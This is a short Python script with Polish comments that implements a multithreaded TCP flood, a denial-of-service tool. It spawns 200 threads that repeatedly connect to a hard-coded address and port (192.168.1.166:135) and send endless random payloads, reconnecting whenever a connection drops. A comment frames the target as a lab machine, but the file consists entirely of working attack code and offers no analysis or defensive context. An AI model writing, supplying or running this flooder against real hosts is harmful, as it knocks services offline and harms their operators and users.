import socket
import threading
import time
import random
import string

TARGET_IP = '192.168.1.166'   # Zamień na IP serwera/routera w Twoim labie
TARGET_PORT = 135         # Port TCP do floodowania
NUM_THREADS = 200

def random_payload(size=1024):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()

def tcp_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET_IP, TARGET_PORT))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # wysyłaj od razu
            while True:
                s.sendall(random_payload(1024))  # surowe dane TCP
        except Exception:
            s.close()
            time.sleep(0.05)  # króciutki odpoczynek przed kolejną próbą

threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=tcp_flood, name=f"Wątek-{i+1}", daemon=True)
    t.start()
    threads.append(t)

print(f"🚀 TCP flood uruchomiony na {TARGET_IP}:{TARGET_PORT} z {NUM_THREADS} wątkami. Przerwij Ctrl+C.")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n✅ Flood zakończony (Ctrl+C)")
